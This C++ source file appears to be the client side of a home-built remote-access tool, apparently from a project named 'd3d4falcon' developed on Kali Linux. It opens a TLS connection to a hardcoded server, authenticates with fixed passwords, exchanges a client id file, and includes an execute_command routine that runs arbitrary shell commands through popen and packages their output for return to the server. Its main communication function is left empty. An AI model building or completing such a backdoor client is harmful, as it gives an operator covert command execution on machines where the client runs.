#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include <random>
#include <string>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <fstream>
#include <iostream>
#include <sstream>


void get_software_version(SSL* ssl) {
    std::string version = "1.0";
    SSL_write(ssl, version.c_str(), version.length());

}

bool fileExists(const std::string& filename) {
    std::ifstream file(filename);
    return file.good();
}
std::string readFile(const std::string& filename) {
    std::ifstream file(filename);
    if (!file.is_open()) {
        return "";
    }

    std::stringstream buffer;
    buffer << file.rdbuf();
    return buffer.str();
}

//first authenication
void auth(SSL* ssl) {
    //se il fie esiste 
    if (fileExists("id")) {
        const char* password = "12341";
        SSL_write(ssl, password, strlen(password));
        // read and send file content
        std::string file_content = readFile("id");
        SSL_write(ssl, file_content.c_str(), file_content.size());
    } else {
        //se non esiste
        const char* password = "12340";
        SSL_write(ssl, password, strlen(password));
        // receive and write id to file
        char id_buf[1024];
        int received_id = SSL_read(ssl, id_buf, sizeof(id_buf));
        if (received_id > 0) {
            std::ofstream id_file("id");
            id_file.write(id_buf, received_id);
            id_file.close();
        }
    }
}

//esegue il comando e restituisce l'output
std::string execute_command(std::string command) {
    // Costruisce il comando completo
    std::string full_command = command + " 2>&1";
    // Crea un buffer per l'output
    char buffer[1024];
    std::string output = "";
    // Crea un pipe per leggere l'output del comando
    FILE* pipe = popen(full_command.c_str(), "r");

    // Legge l'output del comando
    while (!feof(pipe)) {
        if (fgets(buffer, 1024, pipe) != NULL) {
            // Aggiunge l'output al buffer
            output += buffer;
        }
    }
    // Rimuove il carattere di newline finale dall'output
    if (!output.empty()) {
        output.erase(output.length() - 1);
    }

    // Chiude il pipe
    pclose(pipe);
    return output;
}

// Costruisce il messaggio nel formato richiesto
std::string format_message(std::string command, std::string output, std::string client_id) {
    std::string message = command + "<-->" + output + "<-->" + client_id;
    return message;
}

//server comunications
void comunicate(SSL* ssl) {

}

int main() {

    // Initialize OpenSSL library
    SSL_library_init();

    //creazione del socket IPv4, TCP
    int client_socket = socket(AF_INET, SOCK_STREAM, 0);

    // Create SSL/TLS context
    SSL_CTX* ssl_ctx = SSL_CTX_new(TLS_client_method());

    // Load SSL/TLS certificates
    SSL_CTX_use_certificate_file(ssl_ctx, "/home/kali/Repositories/d3d4falcon/server/server_certificate/servercert.pem", SSL_FILETYPE_PEM);
    SSL_CTX_use_PrivateKey_file(ssl_ctx, "/home/kali/Repositories/d3d4falcon/server/server_certificate/serverkey.pem", SSL_FILETYPE_PEM);

    // Create SSL/TLS object
    SSL* ssl = SSL_new(ssl_ctx);

    // Associate SSL/TLS object with client socket
    SSL_set_fd(ssl, client_socket);

    // set IP address and port
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(55555);
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

    try {
        //connessione
        int connect_result = connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));
        SSL_connect(ssl);
        std::cout << "connected" << std::endl;
        if (connect_result == -1) {
            throw std::runtime_error("Failed to connect to server.");
        }

        auth(ssl);
        std::cout << "autheticated" << std::endl;

        comunicate(ssl);

    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        close(client_socket);
        return 1;
    }

    // Terminate SSL/TLS connection
    SSL_shutdown(ssl);

    close(client_socket);

    return 0;
}